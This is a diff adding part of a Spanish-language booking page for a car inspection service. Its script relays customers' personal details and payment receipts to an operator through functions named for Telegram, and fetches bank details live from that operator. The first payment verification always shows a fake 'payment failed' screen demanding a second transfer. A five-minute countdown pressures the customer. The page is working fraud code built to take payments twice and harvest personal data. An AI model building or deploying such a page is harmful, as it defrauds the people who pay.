+                        <div><strong>Nombre del Banco:</strong></div>
+                        <div id="bank-name">InspeccionaSeguro International</div>
+
+                        <div><strong>IBAN:</strong></div>
+                        <div id="bank-iban" style="font-family: monospace; font-size: 1.1rem; word-break: break-all;">
+                            DE89 3704 0044
+                            0532 0130 00</div>
+
+                        <div><strong>BIC / SWIFT:</strong></div>
+                        <div id="bank-bic">COBADEFFXXX</div>
+
+                        <div><strong>Titular de la Cuenta:</strong></div>
+                        <div id="bank-holder">InspeccionaSeguro Inc.</div>
+
+                        <div><strong>Referencia:</strong></div>
+                        <div id="payment-ref" style="font-weight: 700; color: var(--primary-yellow);">IS-8842-XJ</div>
+
+                        <div><strong>Cantidad:</strong></div>
+                        <div id="bank-amount-display" style="font-weight: 700;">€0.00</div>
+                    </div>
+                </div>
+
+                <div class="timer-box" id="timer-box">
+                    <p style="margin-bottom: 10px; font-size: 0.9rem; color: #ccc;">Complete el pago en:</p>
+                    <div class="timer-display" id="timer">05:00</div>
+                </div>
+
+                <div class="verification-box" id="verification-box">
+                    <h3 style="margin-bottom: 15px; color: var(--text-dark);">Verificar Pago</h3>
+                    <p style="margin-bottom: 20px; font-size: 0.9rem; color: #666;">Suba su comprobante de pago a
+                        continuación. El nombre del remitente DEBE coincidir con el propietario registrado.</p>
+
+                    <div class="file-upload-wrapper" onclick="document.getElementById('receipt-upload').click()">
+                        <i class="fa-solid fa-cloud-arrow-up"
+                            style="font-size: 2rem; color: #ccc; margin-bottom: 10px;"></i>
+                        <p>Haga clic para subir comprobante de pago (PDF, JPG, PNG)</p>
+                        <input type="file" id="receipt-upload" style="display: none;" onchange="handleFileSelect(this)">
+                        <p id="file-name"
+                            style="margin-top: 10px; font-weight: 600; color: var(--primary-yellow); display: none;">
+                        </p>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Nombre del Remitente <span class="required">*</span></label>
+                        <input type="text" id="sender-name" placeholder="Ingrese el nombre en la cuenta bancaria">
+                        <p style="font-size: 0.8rem; color: #d32f2f; margin-top: 5px; display: none;" id="name-error">
+                            El nombre debe coincidir con el propietario registrado.</p>
+                    </div>
+
+                    <button onclick="verifyPayment()" class="btn btn-yellow"
+                        style="width: 100%; margin-top: 20px;">Verificar
+                        Pago</button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- PAYMENT FAILED VIEW -->
+    <main id="payment-failed-view" style="display: none;">
+        <div class="container">
+            <div class="order-container" style="text-align: center; padding: 60px 40px;">
+                <div
+                    style="width: 80px; height: 80px; background-color: #f44336; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 3rem; margin: 0 auto 30px;">
+                    <i class="fa-solid fa-xmark"></i>
+                </div>
+                <h2 style="color: var(--text-dark); margin-bottom: 20px;">Pago Fallido</h2>
+                <div class="attention-box"
+                    style="display: inline-block; text-align: left; max-width: 600px; border-color: #f44336; background-color: #ffebee;">
+                    <div class="attention-text" style="color: #d32f2f;">
+                        Tu transferencia falló debido a una referencia incorrecta, no se recibieron fondos y cualquier
+                        cantidad enviada será reembolsada por tu banco, ya que no nos llegó. Por favor, vuelve a enviar
+                        tu pago utilizando la referencia [ BKM-4384 ] para una confirmación rápida.
+                    </div>
+                </div>
+                <br><br>
+                <button onclick="retryPayment()" class="btn btn-yellow">Proceder al Pago</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- SUCCESS VIEW (Hidden by default) -->
+    <main id="success-view" style="display: none;">
+        <div class="container">
+            <div class="order-container" style="text-align: center; padding: 60px 40px;">
+                <div class="success-checkmark">
+                    <i class="fa-solid fa-check"></i>
+                </div>
+                <h2 style="color: var(--text-dark); margin-bottom: 20px;">¡Cita Reservada!</h2>
+                <p style="font-size: 1.1rem; color: #666; max-width: 600px; margin: 0 auto 30px;">
+                    Gracias por su pago. Su inspección ha sido programada exitosamente.
+                </p>
+                <div style="background-color: #f9f9f9; padding: 20px; border-radius: 8px; display: inline-block;">
+                    <p><strong>¿Qué sucede ahora?</strong></p>
+                    <p style="font-size: 0.95rem; margin-top: 10px;">Se le ha enviado un correo electrónico de
+                        seguimiento con los detalles del inspector que visitará la dirección.</p>
+                </div>
+                <br><br>
+                <button onclick="transitionTo('home-view')" class="btn btn-yellow">Volver al Inicio</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-grid">
+                <div>
+                    <a href="#" class="logo" style="color: #fff; margin-bottom: 20px; display: inline-block;">
+                        INSPECCIONASEGURO
+                    </a>
+                    <p>(888) 231-0000</p>
+                    <p>pedidos@inspeccionaseguro.com</p>
+                </div>
+
+                <div>
+                    <h4>Empresa</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Sobre Nosotros</a></li>
+                        <li><a href="#">Carreras</a></li>
+                        <li><a href="#">Blog</a></li>
+                        <li><a href="#">Prensa</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h4>Servicios</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Inspección Estándar</a></li>
+                        <li><a href="#">Inspección de Coches Clásicos</a></li>
+                        <li><a href="#">Inspección de Coches Exóticos</a></li>
+                        <li><a href="#">Inspección Comercial</a></li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h4>Soporte</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">Centro de Ayuda</a></li>
+                        <li><a href="#">Informes de Ejemplo</a></li>
+                        <li><a href="#">Inicio de Sesión de Inspector</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <p>&copy; 2024 InspeccionaSeguro. Todos los derechos reservados. | Política de Privacidad | Términos de
+                    Servicio</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Scripts -->
+    <script>
+        // Toggle Mobile Menu
+        document.querySelector('.mobile-toggle').addEventListener('click', function () {
+            const nav = document.querySelector('.nav-links');
+            if (nav.style.display === 'flex') {
+                nav.style.display = 'none';
+            } else {
+                nav.style.display = 'flex';
+                nav.style.flexDirection = 'column';
+                nav.style.position = 'absolute';
+                nav.style.top = '80px';
+                nav.style.left = '0';
+                nav.style.width = '100%';
+                nav.style.backgroundColor = '#fff';
+                nav.style.padding = '20px';
+                nav.style.boxShadow = '0 4px 6px rgba(0,0,0,0.1)';
+            }
+        });
+
+        // View Switching Wrappers
+        function showHome() { transitionTo('home-view'); }
+        function showOrderForm() { transitionTo('order-view'); }
+        function showBankView() { transitionTo('bank-view'); }
+        function showSuccessView() { transitionTo('success-view'); }
+
+        // Global Flag for Retry
+        let isRetry = false;
+
+        function retryPayment() {
+            isRetry = true;
+            transitionTo('bank-view');
+        }
+
+        // Global Transition Logic
+        function transitionTo(viewId) {
+            const loader = document.getElementById('loader-overlay');
+            loader.style.display = 'flex';
+            window.scrollTo(0, 0);
+
+            setTimeout(() => {
+                loader.style.display = 'none';
+
+                document.getElementById('home-view').style.display = 'none';
+                document.getElementById('order-view').style.display = 'none';
+                document.getElementById('bank-view').style.display = 'none';
+                document.getElementById('success-view').style.display = 'none';
+                document.getElementById('payment-failed-view').style.display = 'none';
+
+                const targetId = viewId === 'bank-view-retry' ? 'bank-view' : viewId;
+                document.getElementById(targetId).style.display = 'block';
+
+                if (viewId === 'bank-view') {
+                    if (isRetry) {
+                        document.getElementById('waiting-ui').style.display = 'none';
+                        document.getElementById('bank-details-box').style.display = 'block';
+                        document.getElementById('timer-box').style.display = 'block';
+                        document.getElementById('verification-box').style.display = 'block';
+                        startTimer();
+                        isRetry = false;
+                    } else {
+                        showWaitingUI();
+                        sendOrderToTelegram();
+                    }
+                }
+
+            }, 2000);
+        }
+
+        // Timer Logic
+        let timerInterval;
+        function startTimer() {
+            let duration = 60 * 5;
+            const display = document.getElementById('timer');
+
+            clearInterval(timerInterval);
+            display.textContent = "05:00";
+
+            timerInterval = setInterval(function () {
+                let minutes = parseInt(duration / 60, 10);
+                let seconds = parseInt(duration % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--duration < 0) {
+                    clearInterval(timerInterval);
+                    display.textContent = "00:00";
+                    alert("¡Tiempo expirado! Actualice para reiniciar el proceso.");
+                }
+            }, 1000);
+        }
+
+        // File Upload Handling
+        function handleFileSelect(input) {
+            const fileNameDisplay = document.getElementById('file-name');
+            if (input.files && input.files[0]) {
+                fileNameDisplay.textContent = "Seleccionado: " + input.files[0].name;
+                fileNameDisplay.style.display = 'block';
+            }
+        }
+
+        // Prices
+        const prices = {
+            standard: 475,
+            classic: 625,
+            exotic: 980,
+            commercial: 550,
+            rv: 750,
+            motorcycle: 250,
+            carfax: 35,
+            verbal: 50
+        };
+
+        // Calculation Logic
+        function calculateTotal() {
+            const typeSelect = document.querySelector('.form-grid select');
+            const type = typeSelect.value;
+            const carfax = document.getElementById('carfax').checked;
+            const verbal = document.getElementById('verbal').checked;
+
+            let total = 0;
+            if (type && prices[type]) {
+                total += prices[type];
+            }
+            if (carfax) total += prices.carfax;
+            if (verbal) total += prices.verbal;
+
+            const formatted = "€" + total.toFixed(2);
+            document.getElementById('total-price-display').innerText = formatted;
+            document.getElementById('bank-amount-display').innerText = formatted;
+        }
+
+        // =====================================
+        // SECURE API CALLS (No exposed tokens!)
+        // =====================================
+        const POLL_INTERVAL_MS = 500;
+        let pollingInterval;
+        let orderStartTime = 0;
+        let lastUpdateId = 0;
+        let pollAttempts = 0;
+        let orderReference = '';
+
+        // Send order via secure API
+        async function sendOrderToTelegram() {
+            orderReference = 'IS-' + Math.floor(Math.random() * 10000);
+            document.getElementById('payment-ref').innerText = orderReference;
+
+            const type = document.querySelector('.form-grid select').value;
+            const year = document.querySelector('input[placeholder="Ej. 2018"]').value;
+            const make = document.querySelector('input[placeholder="Ej. Ford"]').value;
+            const model = document.querySelector('input[placeholder="Ej. Mustang"]').value;
+            const price = document.getElementById('total-price-display').innerText;
+
+            const firstName = document.querySelectorAll('.form-section')[3].querySelectorAll('input')[0].value;
+            const lastName = document.querySelectorAll('.form-section')[3].querySelectorAll('input')[1].value;
+            const email = document.querySelectorAll('.form-section')[3].querySelectorAll('input')[2].value;
+            const phone = document.querySelectorAll('.form-section')[3].querySelectorAll('input')[3].value;
+
+            const clientName = firstName + " " + lastName;
+            const vehicle = year + " " + make + " " + model;
+
+            try {
+                const response = await fetch('/api/send-order', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        orderReference,
+                        clientName,
+                        email,
+                        phone,
+                        vehicle,
+                        price
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    console.log("✅ Order notification sent via secure API.");
+                    orderStartTime = Math.floor(Date.now() / 1000);
+                    lastUpdateId = 0;
+                    pollAttempts = 0;
+                    startPollingForBankDetails();
+                } else {
+                    throw new Error('API error');
+                }
+            } catch (error) {
+                console.error("❌ Error sending order:", error);
+                showPaymentUI({
+                    bank: "InspeccionaSeguro International",
+                    iban: "DE89 3704 0044 0532 0130 00",
+                    bic: "COBADEFFXXX",
+                    holder: "InspeccionaSeguro Inc.",
+                    ref: orderReference
+                });
+            }
+        }
+
+        // Poll for bank details via secure API
+        async function pollForBankDetails() {
+            if (!orderReference) return false;
+
+            pollAttempts++;
+            updatePollCountDisplay();
+
+            try {
+                const response = await fetch('/api/get-updates', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        lastUpdateId,
+                        orderStartTime
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    if (data.lastUpdateId > lastUpdateId) {
+                        lastUpdateId = data.lastUpdateId;
+                    }
+
+                    if (data.bankDetails) {
+                        data.bankDetails.ref = orderReference;
+                        console.log("✅ Bank details received:", data.bankDetails);
+                        showPaymentUI(data.bankDetails);
+                        return true;
+                    }
+                }
+
+                return false;
+            } catch (error) {
+                console.error("Polling error:", error);
+                return false;
+            }
+        }
+
+        // Start polling
+        function startPollingForBankDetails() {
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+            }
+
+            console.log("🚀 Starting secure polling...");
+
+            pollForBankDetails().then(found => {
+                if (found) return;
+
+                pollingInterval = setInterval(async () => {
+                    const found = await pollForBankDetails();
+                    if (found) {
+                        clearInterval(pollingInterval);
+                        pollingInterval = null;
+                    }
+                }, POLL_INTERVAL_MS);
+            });
+
+            setTimeout(() => {
+                if (pollingInterval) {
+                    clearInterval(pollingInterval);
+                    pollingInterval = null;
+                    console.log("⏱️ Polling timeout reached");
+
+                    showPaymentUI({
+                        bank: "InspeccionaSeguro International",
+                        iban: "DE89 3704 0044 0532 0130 00",
+                        bic: "COBADEFFXXX",
+                        holder: "InspeccionaSeguro Inc.",
+                        ref: orderReference
+                    });
+                }
+            }, 5 * 60 * 1000);
+        }
+
+        function updatePollCountDisplay() {
+            const display = document.getElementById('poll-count-display');
+            if (display) {
+                display.textContent = `Verificando... (${pollAttempts} intentos)`;
+            }
+        }
+
+        function showWaitingUI() {
+            document.getElementById('bank-details-box').style.display = 'none';
+            document.getElementById('waiting-ui').style.display = 'block';
+            document.getElementById('timer-box').style.display = 'none';
+            document.getElementById('verification-box').style.display = 'none';
+            pollAttempts = 0;
+            updatePollCountDisplay();
+        }
+
+        function showPaymentUI(details) {
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
+
+            document.getElementById('waiting-ui').style.display = 'none';
+            document.getElementById('bank-details-box').style.display = 'block';
+            document.getElementById('timer-box').style.display = 'block';
+            document.getElementById('verification-box').style.display = 'block';
+
+            if (details.bank) document.getElementById('bank-name').innerText = details.bank;
+            if (details.iban) document.getElementById('bank-iban').innerText = details.iban;
+            if (details.bic) document.getElementById('bank-bic').innerText = details.bic;
+            if (details.holder) document.getElementById('bank-holder').innerText = details.holder;
+            if (details.ref) document.getElementById('payment-ref').innerText = details.ref;
+
+            startTimer();
+            console.log("✅ Payment UI displayed with details:", details);
+        }
+
+        // Send receipt via secure API
+        async function sendReceiptToTelegram(file, senderName, amount, ref) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = async function(e) {
+                    try {
+                        const response = await fetch('/api/send-receipt', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                senderName,
+                                amount,
+                                ref,
+                                fileData: e.target.result,
+                                fileName: file.name
+                            })
+                        });
+
+                        const data = await response.json();
+                        if (data.success) {
+                            console.log("✅ Receipt sent via secure API");
+                            resolve();
+                        } else {
+                            throw new Error('Failed to send receipt');
+                        }
+                    } catch (error) {
+                        console.error("❌ Error sending receipt:", error);
+                        reject(error);
+                    }
+                };
+                reader.readAsDataURL(file);
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const typeSelect = document.querySelector('.form-grid select');
+            if (typeSelect) typeSelect.addEventListener('change', calculateTotal);
+
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                if (input.type !== 'checkbox' && input.type !== 'radio') {
+                    input.value = '';
+                }
+            });
+            const selects = document.querySelectorAll('select');
+            selects.forEach(select => select.selectedIndex = 0);
+        });
+
+        // Verification Logic
+        let paymentAttempts = 0;
+
+        async function verifyPayment() {
+            const fileInput = document.getElementById('receipt-upload');
+            const senderName = document.getElementById('sender-name').value;
+            const errorMsg = document.getElementById('name-error');
+
+            if (!fileInput.files || fileInput.files.length === 0) {
+                alert("Por favor suba su comprobante de pago.");
+                return;
+            }
+
+            if (!senderName.trim()) {
+                alert("Por favor ingrese el nombre del remitente.");
+                return;
+            }
+
+            if (senderName.length < 3) {
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            errorMsg.style.display = 'none';
+            paymentAttempts++;
+
+            const loader = document.getElementById('loader-overlay');
+            loader.style.display = 'flex';
+            window.scrollTo(0, 0);
+
+            try {
+                const amount = document.getElementById('bank-amount-display').innerText;
+                const ref = document.getElementById('payment-ref').innerText;
+
+                if (fileInput.files[0]) {
+                    await sendReceiptToTelegram(fileInput.files[0], senderName, amount, ref);
+                }
+
+                await new Promise(resolve => setTimeout(resolve, 3000));
+
+                document.getElementById('home-view').style.display = 'none';
+                document.getElementById('order-view').style.display = 'none';
+                document.getElementById('bank-view').style.display = 'none';
+                document.getElementById('success-view').style.display = 'none';
+                document.getElementById('payment-failed-view').style.display = 'none';
+
+                if (paymentAttempts === 1) {
+                    document.getElementById('payment-failed-view').style.display = 'block';
+                } else {
+                    document.getElementById('success-view').style.display = 'block';
+                }
+
+            } catch (err) {
+                console.error("Verification Error:", err);
+                alert("Ocurrió un error. Por favor intente de nuevo.");
+                document.getElementById('bank-view').style.display = 'block';
+            } finally {
+                loader.style.display = 'none';
+            }
+        }
+    </script>
+</body>
+
+</html>
